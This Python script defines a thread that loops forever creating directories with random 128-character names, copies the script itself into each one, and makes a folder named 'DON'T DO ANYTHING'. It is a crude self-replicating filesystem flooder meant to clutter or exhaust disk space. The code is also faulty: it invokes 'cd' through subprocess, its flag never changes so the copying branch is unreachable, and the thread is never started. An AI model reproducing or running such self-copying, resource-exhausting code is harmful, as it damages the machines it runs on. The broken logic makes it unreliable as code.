import sys
import os
import random
import string
import subprocess
import threading

SCRIPT = sys.argv
NAME = str(SCRIPT[0])

def RANDOM_(Length):
	Letters_ = string.ascii_lowercase
	return ''.join(random.choice(Letters_) for i in range(Length))

def NEW_():
	print("")

class Pink(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)



	def run(self):
		Bool = False
		while True:
			if Bool == False:
				subprocess.call(['cd', '..'])
			
				subprocess.call(['mkdir', 'system_logs'])
				subprocess.call(['mkdir', 'logs'])
				subprocess.call(['mkdir', '__init__'])

			else:


				DIR_NAME_P1 = RANDOM_(32)
				DIR_NAME_P2 = RANDOM_(32)
				DIR_NAME_P3 = RANDOM_(32)
				DIR_NAME_P4 = RANDOM_(32)

				DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
				subprocess.call(['mkdir', DirectoryName])
				subprocess.call(['cp', NAME, DirectoryName])
				subprocess.call(['mkdir', "DON'T DO ANYTHING"])
